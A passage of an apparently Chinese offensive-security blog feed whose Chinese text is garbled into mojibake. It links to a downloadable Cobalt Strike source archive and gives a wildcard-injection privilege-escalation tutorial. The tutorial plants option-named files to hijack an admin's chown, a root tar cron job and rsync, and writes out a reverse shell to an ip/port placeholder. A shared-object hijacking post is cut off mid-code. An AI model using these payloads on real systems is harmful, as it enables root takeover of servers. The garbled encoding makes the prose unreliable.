        <content type="html"><![CDATA[<h2 id="CobaltStrikeçš„æºä»£ç "><a href="#CobaltStrikeçš„æºä»£ç " class="headerlink" title="CobaltStrikeçš„æºä»£ç "></a>CobaltStrikeçš„æºä»£ç </h2><p>æ­¤srcä»£ç å¯ä»¥åœ¨IDEAä¸­è¿è¡Œï¼Œéœ€è¦jdk8 +ï¼Œç‰ˆæœ¬5.x</p><h2 id="Githubé¡¹ç›®åœ°å€"><a href="#Githubé¡¹ç›®åœ°å€" class="headerlink" title="Githubé¡¹ç›®åœ°å€"></a>Githubé¡¹ç›®åœ°å€</h2><p><a href="https://github.com/Freakboy/CobaltStrike">https://github.com/Freakboy/CobaltStrike</a></p><h2 id="åŠŸèƒ½æˆªå›¾"><a href="#åŠŸèƒ½æˆªå›¾" class="headerlink" title="åŠŸèƒ½æˆªå›¾"></a>åŠŸèƒ½æˆªå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2621748566.png"></p><h2 id="CobaltStrikeæºä»£ç ä¸‹è½½åœ°å€"><a href="#CobaltStrikeæºä»£ç ä¸‹è½½åœ°å€" class="headerlink" title="CobaltStrikeæºä»£ç ä¸‹è½½åœ°å€"></a>CobaltStrikeæºä»£ç ä¸‹è½½åœ°å€</h2><p>â‘ GitHub: CobaltStrike/archive/master.zip</p><p>ä¸‹è½½æºä»£ç ï¼Œå¯èƒ½ä¼šæŠ¥æ¯’ï¼Œè¯·åœ¨è™šæ‹Ÿæœºä¸­è§£å‹ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1315185602.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¥è‡ªä¸Šå¤çš„ææƒæŠ€æœ¯-é€šé…ç¬¦æ³¨å…¥</title>
      <link href="2020/11/11/%E6%9D%A5%E8%87%AA%E4%B8%8A%E5%8F%A4%E7%9A%84%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%A8%E5%85%A5/"/>
      <url>2020/11/11/%E6%9D%A5%E8%87%AA%E4%B8%8A%E5%8F%A4%E7%9A%84%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šæ­£å¦‚æ ‡é¢˜æ‰€è¯´ï¼Œæ­¤æŠ€æœ¯å¾ˆæ—©ä»¥å‰å°±æœ‰äº†ï¼Œä½†æ˜¯å…¶ä¸­ä¸€äº›åˆ©ç”¨æ€è·¯ä¹Ÿå€¼å¾—æˆ‘ä»¬å€Ÿé‰´ï¼Œå› ä¸ºç½‘ç«™è¿ç»´äººå‘˜æˆ–ç®¡ç†å‘˜ï¼Œç»å¸¸ä¼šå¤‡ä»½ç½‘ç«™ï¼Œä»¥åŠè®¾ç½®ä¸€äº›å®šæ—¶ä»»åŠ¡æ¥ä¼˜åŒ–ç½‘ç«™ç®¡ç†ï¼Œæ‰€æœ‰è¿™é¡¹æ”»å‡»æŠ€æœ¯ï¼Œæˆ‘ä»¬ä¹Ÿä¼šç»å¸¸ç”¨åˆ°ã€‚</p></blockquote><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>åœ¨shellç»ˆç«¯ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ç”¨é€šé…ç¬¦æ¥å·æ‡’ï¼Œæ¥åŒ¹é…æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼Œæ— è®ºæ˜¯æ–‡ä»¶è¿˜æ˜¯ç›®å½•ï¼Œéƒ½é€‚ç”¨ã€‚<br>è®¤è¯†éƒ¨åˆ†é€šé…ç¬¦ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* åŒ¹é…ä»»æ„å¤šä¸ªå­—ç¬¦</span><br><span class="line">? ä»£è¡¨ä»»æ„å•ä¸ªå­—ç¬¦</span><br><span class="line">[ ] ä»£è¡¨â€œ[â€å’Œâ€œ]â€ä¹‹é—´çš„æŸä¸€ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚[0-9]å¯ä»¥ä»£è¡¨0-9ä¹‹é—´çš„ä»»æ„ä¸€ä¸ªæ•°å­—ï¼Œ[a-zA-Z]å¯ä»¥ä»£è¡¨a-zå’ŒA-Zä¹‹é—´çš„ä»»æ„ä¸€ä¸ªå­—æ¯ï¼Œå­—æ¯åŒºåˆ†å¤§å°å†™ã€‚</span><br><span class="line">â€“ ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ã€‚</span><br><span class="line">~ ç”¨æˆ·çš„æ ¹ç›®å½•ã€‚</span><br></pre></td></tr></table></figure><h3 id="é€šé…ç¬¦åŠ«æŒçš„ç¬¬ä¸€æ¬¡åˆ©ç”¨-chownå‘½ä»¤æ‰©å±•-chownåŠ«æŒ"><a href="#é€šé…ç¬¦åŠ«æŒçš„ç¬¬ä¸€æ¬¡åˆ©ç”¨-chownå‘½ä»¤æ‰©å±•-chownåŠ«æŒ" class="headerlink" title="é€šé…ç¬¦åŠ«æŒçš„ç¬¬ä¸€æ¬¡åˆ©ç”¨-chownå‘½ä»¤æ‰©å±•(chownåŠ«æŒ)"></a>é€šé…ç¬¦åŠ«æŒçš„ç¬¬ä¸€æ¬¡åˆ©ç”¨-chownå‘½ä»¤æ‰©å±•(chownåŠ«æŒ)</h3><p>å¦‚æœä½ å¯¹Linux/Unixç³»ç»Ÿç¨å¾®äº†è§£è¿‡ï¼Œå°±çŸ¥é“ï¼Œåœ¨ç³»ç»Ÿä¸‹ï¼Œä¸€åˆ‡çš†æ–‡ä»¶ï¼Œè€Œæ–‡ä»¶ä¹Ÿä¼šå±äºæŸä¸ªç”¨æˆ·ï¼ŒæŸä¸ªç»„ï¼Œä¹Ÿä¼šç›¸åº”çš„æ–‡ä»¶æ“ä½œçš„æƒé™ï¼Œå¯è¯»å¯å†™å¯æ‰§è¡Œã€‚</p><p>è€Œchownå‘½ä»¤åˆ™å¯ä»¥æ›´æ”¹æ–‡ä»¶çš„è¿™äº›å±æ€§ï¼Œè¯¦æƒ…å¯ä»¥æŸ¥çœ‹linuxå‘½ä»¤æ‰‹å†Œã€‚</p><p>å…¶ä¸­æˆ‘ä»¬é‡ç‚¹å…³æ³¨ â€“reference=RFILE  é€‰é¡¹</p><p>æˆ‘ä»¬æ¥çœ‹çœ‹å®ƒè‡ªå·±ç»™çš„è§£é‡Š</p><p>use RFILEâ€™s owner and group rather than specifying OWNER:GROUP values</p><p>è¿™å¥è¯çš„æ„æ€æ˜¯ï¼Œä½¿ç”¨çš„æ˜¯RFILEæ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„çš„è¿™ä¸ªå±æ€§ï¼Œè€Œä¸æ˜¯æ‰§è¡Œå‘½ä»¤æ‰€å¸¦çš„å‚æ•°OWNER:GROUP</p><p>æˆ‘ç›´æ¥ç”¨æ —å­æ¥è§£é‡Šä¸€ä¸‹ï¼š</p><p>å¦‚æœæˆ‘è¦æ›´æ”¹script.shæ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„ä¸ºtestè¿™ä¸ªç”¨æˆ·ï¼Œå½“ç„¶ä½ å‰ææœ‰rootæƒé™ï¼Œæˆ–è€…rootæƒé™æ‰§è¡Œæ­¤å‘½ä»¤ï¼Œæˆ‘ä»¬å°†è¾“å…¥è¿™æ ·çš„å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R test:test script.sh &#x2F;&#x2F;å¦‚æœä½ åˆ›å»ºä¸€ä¸ªtestç”¨æˆ·ï¼Œç³»ç»Ÿå°†é»˜è®¤åˆ›å»ºä¸€ä¸ªtestç»„ï¼Œå¹¶æŠŠtestè‡ªåŠ¨åŠ åœ¨testç»„é‡Œ</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœæˆ‘ä¸æƒ³è¾“å…¥test:test,é‚£æˆ‘è¿˜è¦å…¶ä»–åŠæ³•å—ï¼Ÿæœ‰çš„ï¼Œè¯·çœ‹ä¸‹é¢çš„æ —å­ï¼š<br>å¦‚æœæ­¤ç›®å½•ä¸‹æœ‰ä¸ª11.shè„šæœ¬ï¼Œå®ƒæ–‡ä»¶æ‰€æœ‰è€…ä¸ºtestæ‰€å±ç»„ä¸ºtestç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨â€“reference=é€‰é¡¹æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown --reference&#x3D;11.sh script.sh</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œå‘½ä»¤æ‰§è¡Œç»“æœä¼šæ˜¯å•¥?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R root:root --reference&#x3D;11.sh script.sh</span><br></pre></td></tr></table></figure><p>script.shæ–‡ä»¶çš„æ‰€æœ‰è€…å°†ä¼šæ˜¯testæ‰€å±ç»„ä¹Ÿæ˜¯testï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰â€“reference=FILEé€‰é¡¹åœ¨ï¼Œroot:rootå°†æ²¡æœ‰æ„ä¹‰ï¼Œâ€“reference=FILEä¼˜å…ˆçº§æ›´é«˜ã€‚<br>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬çš„åˆ©ç”¨å°±æ¥äº†ï¼Œç½‘ç«™è¿ç»´äººå‘˜å’Œç®¡ç†å‘˜æœ‰æ—¶ä¼šé‡åˆ°å¾ˆå¤šæ–‡ä»¶å’Œå¾ˆå¤šç›®å½•çš„éœ€è¦æ›´æ”¹æ‰€æœ‰è€…ï¼Œæ‰€å±ç»„ï¼Œé‚£ä¹ˆèªæ˜çš„è¿ç»´å¤§å¤§ï¼Œå°±ä¼šå·ä¸€æ³¢æ‡’ï¼Œåœ¨ç»ˆç«¯æ•²ä»¥ä¸‹å‘½ä»¤ï¼Œå¹¶ä¸ºæ­¤å¾ˆæ»¡æ„ï¼Œä¸é”™ä¸é”™ï¼ä¸æ„§æ˜¯æˆ‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R æŸä¸ªç”¨æˆ·:æŸä¸ªç»„ *.*</span><br></pre></td></tr></table></figure><p>æ®Šä¸çŸ¥ï¼Œæœ‰ä¸ªé»‘å®¢æ—©å·²ç»åœ¨æ­¤ç›®å½•ä¸‹åŸ‹ä¸‹é™·é˜±ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch hacker.php     &#x2F;&#x2F;åˆ›å»ºæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„æ‰€æœ‰ç»„å’Œæ‰€å±è€…ä¸ºé»‘å®¢æ‹¿åˆ°çš„shellï¼Œä¾‹å¦‚varç”¨æˆ·</span><br><span class="line">touch --reference&#x3D;hacker.php &#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º--reference&#x3D;hacker.phpçš„æ–‡ä»¶,è¿™å°†æ˜¯åŠ«æŒçš„å…³é”®ç‚¹ï¼Œ--reference&#x3D;hacker.phpå°†ä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶åäº†ï¼Œå°†ä¼šæˆä¸ºchownå‘½ä»¤çš„ä¸€ä¸ªé€‰é¡¹</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç½‘ç«™ç®¡ç†å‘˜ä¸€æ‰§è¡Œå‘½ä»¤ï¼Œè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æ‰€æœ‰è€…å°†ä¸ºvarç”¨æˆ·,æ‰€å±ç»„å°†ä¸ºvarç»„<br>æœ¬æ¥hackeræ‹¿åˆ°çš„var shellï¼Œæ— æ³•å¯¹æŸäº›æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œä½†ç°åœ¨å¯ä»¥äº†ï¼æ„Ÿè°¢ç®¡ç†å‘˜å¤§å¤§ï¼Œç¥åŠ©æ”»ï¼</p><h3 id="é€šé…ç¬¦åŠ«æŒçš„ç¬¬äºŒæ¬¡åˆ©ç”¨-tarå‘½ä»¤çš„æ‰©å±•-taråŠ«æŒï¼‰"><a href="#é€šé…ç¬¦åŠ«æŒçš„ç¬¬äºŒæ¬¡åˆ©ç”¨-tarå‘½ä»¤çš„æ‰©å±•-taråŠ«æŒï¼‰" class="headerlink" title="é€šé…ç¬¦åŠ«æŒçš„ç¬¬äºŒæ¬¡åˆ©ç”¨-tarå‘½ä»¤çš„æ‰©å±•(taråŠ«æŒï¼‰"></a>é€šé…ç¬¦åŠ«æŒçš„ç¬¬äºŒæ¬¡åˆ©ç”¨-tarå‘½ä»¤çš„æ‰©å±•(taråŠ«æŒï¼‰</h3><p>tarå‘½ä»¤æ˜¯æˆ‘ä»¬åœ¨linuxç³»ç»Ÿä¸­å¸¸ç”¨çš„ä¸€æ¡å‘½ä»¤ï¼Œæ— è®ºæ˜¯è§£å‹æ–‡ä»¶è¿˜æ˜¯å‹ç¼©æ–‡ä»¶ï¼Œéƒ½å¾ˆniceï¼<br>ä¸€ä¸ªè¿è¥ç­–ç•¥æ¯”è¾ƒå®Œå–„çš„ç½‘ç«™ï¼Œä¸€èˆ¬éƒ½æœ‰å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯ï¼ˆå¤‡ä»½æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼‰ï¼Œé‚£ä¹ˆè¿ç»´äººå‘˜æˆ–ç®¡ç†å‘˜å°†è¾“å…¥å¦‚ä¸‹å‘½ä»¤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf &#x2F;var&#x2F;backups&#x2F;html.tgz &#x2F;var&#x2F;www&#x2F;html&#x2F;*</span><br></pre></td></tr></table></figure><p>ä¹Ÿæœ‰å¯èƒ½ä¼šæŠŠæ­¤å‘½ä»¤åŠ å…¥è®¡åˆ’ä»»åŠ¡ï¼Œå®šæ—¶å®šæœŸçš„å¤‡ä»½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;crontab</span><br><span class="line">*&#x2F;1 *  * * *  root tar -zcf &#x2F;var&#x2F;backups&#x2F;html.tgz &#x2F;var&#x2F;www&#x2F;html&#x2F;* &#x2F;&#x2F;è¿™é‡Œè®¾ç½®æ¯ä¸€åˆ†é’Ÿå¯¹ç½‘ç«™è¿›è¡Œä¸€æ¬¡å¤‡ä»½</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œç›´æ¥ç”¨äº†*é€šé…ç¬¦æ¥åŒ¹é…ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œæ‰€æœ‰æˆ‘ä»¬å¯ä»¥åŠ ä»¥åˆ©ç”¨<br>æˆ‘ä»¬åœ¨æ ¹ç›®å½•ä¸‹è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot; &gt; shell.sh &#x2F;&#x2F;åå¼¹shellçš„æ–‡ä»¶</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot; &#x2F;&#x2F;å› ä¸ºè¿™é‡Œæ–‡ä»¶åå¸¦äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ç”¨äº†â€â€œ</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint&#x3D;1</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„â€“checkpoint-actioné€‰é¡¹ï¼Œç”¨äºæŒ‡å®šåˆ°è¾¾æ£€æŸ¥ç‚¹æ—¶å°†è¦æ‰§è¡Œçš„ç¨‹åºï¼Œè¿™å°†å…è®¸æˆ‘ä»¬è¿è¡Œä¸€ä¸ªä»»æ„çš„å‘½ä»¤ã€‚å› æ­¤ï¼Œè¿™é‡Œçš„æ–‡ä»¶åâ€“checkpoint=1 å’Œ â€“checkpoint-action=exec=sh shell.shæˆä¸ºäº†tarå‘½ä»¤çš„é€‰é¡¹<br>è¿™é‡Œè®¡åˆ’ä»»åŠ¡è¿è¡Œï¼Œä½ å°†è·å¾—ä¸€ä¸ªrootæƒé™çš„shellï¼Œä¸€èˆ¬è®¡åˆ’ä»»åŠ¡éƒ½æ˜¯rootæƒé™</p><h3 id="é€šé…ç¬¦åŠ«æŒçš„ç¬¬ä¸‰æ¬¡åˆ©ç”¨-rsyncå‘½ä»¤çš„æ‰©å±•-rsyncåŠ«æŒï¼‰"><a href="#é€šé…ç¬¦åŠ«æŒçš„ç¬¬ä¸‰æ¬¡åˆ©ç”¨-rsyncå‘½ä»¤çš„æ‰©å±•-rsyncåŠ«æŒï¼‰" class="headerlink" title="é€šé…ç¬¦åŠ«æŒçš„ç¬¬ä¸‰æ¬¡åˆ©ç”¨-rsyncå‘½ä»¤çš„æ‰©å±•(rsyncåŠ«æŒï¼‰"></a>é€šé…ç¬¦åŠ«æŒçš„ç¬¬ä¸‰æ¬¡åˆ©ç”¨-rsyncå‘½ä»¤çš„æ‰©å±•(rsyncåŠ«æŒï¼‰</h3><p>rsyncå‘½ä»¤æ˜¯ä¸€ä¸ªè¿œç¨‹æ•°æ®åŒæ­¥å·¥å…·ï¼Œå¯é€šè¿‡LAN/WANå¿«é€ŸåŒæ­¥å¤šå°ä¸»æœºé—´çš„æ–‡ä»¶ã€‚rsyncä½¿ç”¨æ‰€è°“çš„â€œrsyncç®—æ³•â€æ¥ä½¿æœ¬åœ°å’Œè¿œç¨‹ä¸¤ä¸ªä¸»æœºä¹‹é—´çš„æ–‡ä»¶è¾¾åˆ°åŒæ­¥ï¼Œè¿™ä¸ªç®—æ³•åªä¼ é€ä¸¤ä¸ªæ–‡ä»¶çš„ä¸åŒéƒ¨åˆ†ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½æ•´ä»½ä¼ é€ï¼Œå› æ­¤é€Ÿåº¦ç›¸å½“å¿«,åŠŸèƒ½ç›¸å½“äºæ•°æ®å¤‡ä»½ä¸­çš„å·®å¼‚å¤‡ä»½ã€‚<br>å®é™…åº”ç”¨åœºæ™¯ï¼Œå¤§ä¸€ç‚¹ç½‘ç«™çš„æ•°æ®å¤‡ä»½æ–‡ä»¶éƒ½æ˜¯å¾€ä¸“ç”¨å¤‡ä»½æœåŠ¡å™¨ä¼ è¾“çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥åŠ«æŒrsyncæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚<br>æˆ‘ä»¬é‡ç‚¹å…³æ³¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-e, --rsh&#x3D;command æŒ‡å®šä½¿ç”¨rshã€sshæ–¹å¼è¿›è¡Œæ•°æ®åŒæ­¥ã€‚--rsync-path&#x3D;PATH æŒ‡å®šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„rsyncå‘½ä»¤æ‰€åœ¨è·¯å¾„ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç›´æ¥æŸ¥çœ‹ä¸€ä¸ªç¤ºä¾‹æ¥å­¦ä¹ æ­¤å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -t *.* fooï¼š&#x2F;home&#x2F;hacker&#x2F; &#x2F;&#x2F;è¿™æ¡å‘½ä»¤æ˜¯æŠŠå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°è¿œç¨‹ä¸»æœºfooçš„&#x2F;home&#x2F;hackç›®å½•ä¸‹</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è®¾ä¸‹é™·é˜±åŠ ä»¥åˆ©ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt;&quot;-e &#x2F;bin&#x2F;sh shell.sh&quot; &#x2F;&#x2F;åˆ›å»ºæ–‡ä»¶åä¸º -e &#x2F;bin&#x2F;sh shell.sh</span><br><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot; &gt; shell.sh &#x2F;&#x2F;æ‰§è¡Œåå¼¹å‘½ä»¤è„šæœ¬</span><br></pre></td></tr></table></figure><p>æœ¬æ–‡æ‰€è®¨è®ºçš„æŠ€æœ¯å¯ä»¥ä»¥å„ç§å½¢å¼åº”ç”¨äºunixå’Œlinuxä¸‹çš„å‘½ä»¤ï¼Œä¸ä»…é™äºæ–‡ä¸­ä»‹ç»åˆ°ï¼Œè¿™éœ€è¦ä½ å‘æŒ¥ä½ å¯Œæœ‰åˆ›é€ åŠ›çš„æƒ³è±¡ï¼Œåœ¨å®é™…æ”»å‡»ä¸­ï¼Œå¾€å¾€èƒ½èµ·åˆ°å…‹æ•Œåˆ¶èƒœçš„å…³é”®ï¼ŒæŸ³æš—èŠ±æ˜åˆä¸€æ‘çš„æ„Ÿè§‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€šé…ç¬¦æ³¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…±äº«å¯¹è±¡æ³¨å…¥</title>
      <link href="2020/11/04/%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/"/>
      <url>2020/11/04/%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€œå¦‚ä½•åœ¨ä¸è§£å¯†çš„æƒ…å†µä¸‹ï¼Œç ´è§£SSLçš„æ˜æ–‡æ•°æ®ï¼Ÿé‚£å½“ç„¶æ˜¯ä¸è¦è®©æ˜æ–‡åŠ å¯†äº†ï¼é€»è¾‘é¬¼æ‰ä¸å®¹åé©³â€</p></blockquote><h3 id="é¦–å…ˆï¼Œæˆ‘ä»¬å¾—äº†è§£ä¸€ä¸‹åŸºç¡€çŸ¥è¯†"><a href="#é¦–å…ˆï¼Œæˆ‘ä»¬å¾—äº†è§£ä¸€ä¸‹åŸºç¡€çŸ¥è¯†" class="headerlink" title="é¦–å…ˆï¼Œæˆ‘ä»¬å¾—äº†è§£ä¸€ä¸‹åŸºç¡€çŸ¥è¯†"></a>é¦–å…ˆï¼Œæˆ‘ä»¬å¾—äº†è§£ä¸€ä¸‹åŸºç¡€çŸ¥è¯†</h3><p><strong>ç¨‹åºåº“å¯åˆ†ä¸‰ç±»ï¼šé™æ€åº“ï¼Œå…±äº«åº“å’ŒåŠ¨æ€åŠ è½½åº“</strong></p><p>é™æ€åº“ï¼Œæ˜¯åœ¨æ‰§è¡Œç¨‹åºè¿è¡Œå‰å°±å·²ç»åŠ å…¥åˆ°æ‰§è¡Œç ä¸­ï¼Œåœ¨ç‰©ç†ä¸Šæˆä¸ºæ‰§è¡Œç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼›</p><p>å…±äº«åº“ï¼Œæ˜¯åœ¨æ‰§è¡Œç¨‹åºå¯åŠ¨æ—¶è¢«åŠ è½½åˆ°æ‰§è¡Œç¨‹åºä¸­ï¼Œè¿™æ ·çš„åº“å¯ä»¥è¢«å¤šä¸ªæ‰§è¡Œç¨‹åºå…±äº«ä½¿ç”¨ã€‚</p><p>åŠ¨æ€åŠ è½½åº“ï¼Œå…¶å®å¹¶ä¸æ˜¯ä¸€ç§çœŸæ­£çš„åº“ç±»å‹ï¼Œåº”è¯¥æ˜¯ä¸€ç§åº“çš„ä½¿ç”¨æŠ€æœ¯ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥åœ¨è¿è¡Œè¿‡ç¨‹ä¸­éšæ—¶åŠ è½½å’Œä½¿ç”¨åº“ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå¯æ‰§è¡Œæ–‡ä»¶åŠ è½½åº“çš„æ–¹å¼æœ‰ä¸¤ç§ï¼šåŠ¨æ€åŠ è½½ï¼Œé™æ€å†™å…¥</p><p>ç¬¬ä¸€ç§åº“åŠ è½½æ–¹å¼ï¼Œæ˜¯æŒ‡ç¨‹åºåœ¨å¯åŠ¨æ—¶æ‰ä¼šåŠ¨æ€è°ƒç”¨åº“å‡½æ•°ä»¥åŠä¸€äº›åŠŸèƒ½ã€‚</p><p>ç¬¬äºŒç§åº“ç›´æ¥å°±åŠ è½½å†™å…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶æºä»£ç ï¼Œæ‰€ä»¥è¿™æ ·çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸€èˆ¬éƒ½å¾ˆå¤§ã€‚</p><h3 id="è¡¥å……ï¼ˆå°è¯¾å ‚ï¼‰ï¼š"><a href="#è¡¥å……ï¼ˆå°è¯¾å ‚ï¼‰ï¼š" class="headerlink" title="è¡¥å……ï¼ˆå°è¯¾å ‚ï¼‰ï¼š"></a>è¡¥å……ï¼ˆå°è¯¾å ‚ï¼‰ï¼š</h3><p>åŠ è½½æ—¶é—´ï¼šè½¯ä»¶åœ¨è¿è¡Œä¹‹å‰ï¼Œå®ƒéœ€è¦ä¸€å®šçš„åŠ è½½æ—¶é—´ï¼Œç”¨æ¥åŠ è½½åº“ï¼Œå’ŒåŠ è½½åˆ°å†…å­˜ã€‚</p><p>å‡½æ•°å€’æŒ‚ï¼šæ˜¯æŒ‡ç”¨äºæ‹¦æˆªå¯¹ç°æœ‰å‡½æ•°çš„è°ƒç”¨å¹¶å¯¹å…¶è¿›è¡Œç¯ç»•ä»¥åœ¨è¿è¡Œæ—¶ä¿®æ”¹å‡½æ•°è¡Œä¸ºçš„ä¸€ç³»åˆ—æŠ€æœ¯ã€‚é€šä¿—ä¸€ç‚¹ï¼Œåœ¨å‡½æ•°è°ƒç”¨æ—¶å¼ºè¡Œå¢åŠ ä¸€ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶çš„ç¯èŠ‚ï¼</p><p>ä¸¤ç§åŠ è½½æ–¹å¼å„æœ‰ä¼˜ç¼ºç‚¹ï¼Œä»Šå¤©æˆ‘ä»¬è¦è®²çš„æ˜¯åŠ¨æ€åŠ è½½å…±äº«åº“çš„ä¸€äº›éªšæ“ä½œï¼</p><h3 id="ç¨‹åºåŠ è½½æ—¶çš„å‡½æ•°åŠ«æŒ"><a href="#ç¨‹åºåŠ è½½æ—¶çš„å‡½æ•°åŠ«æŒ" class="headerlink" title="ç¨‹åºåŠ è½½æ—¶çš„å‡½æ•°åŠ«æŒ"></a>ç¨‹åºåŠ è½½æ—¶çš„å‡½æ•°åŠ«æŒ</h3><p>æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªç¨‹åºå¯ä»¥å…ˆçœ‹çœ‹å®ƒæ‰€è°ƒç”¨çš„å‡½æ•°åŠåŠŸèƒ½ï¼Œåœ¨linuxä¸­ï¼Œå¯ä»¥ç”¨readelfï¼Œobjdump å·¥å…·æŸ¥çœ‹ï¼Œå½“ç„¶ä½ ç›´æ¥idaæ‰“å¼€ï¼ŒæŸ¥çœ‹ä¹Ÿæ˜¯æ²¡æ¯›ç—…çš„ï¼</p><p>æˆ‘ä»¬å…ˆè¯•è¯•ç®€å•çš„åŠ«æŒ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1822281002.png"></p><p>è¿™ä¸ªç®€å•çš„testç¨‹åºï¼Œæ‰§è¡Œå«æ‰“å°zhe bo hen  hackerï¼ï¼Œæˆ‘ä»¬åº”è¯¥æ€æ ·æ‰èƒ½æ§åˆ¶å®ƒï¼Œæ‰“å°å‡ºæˆ‘ä»¬<br>æƒ³è¦çš„zhe  bo  hen  niceï¼å‹’ï¼Ÿ<br>ç¼–è¾‘libc_puts.cï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 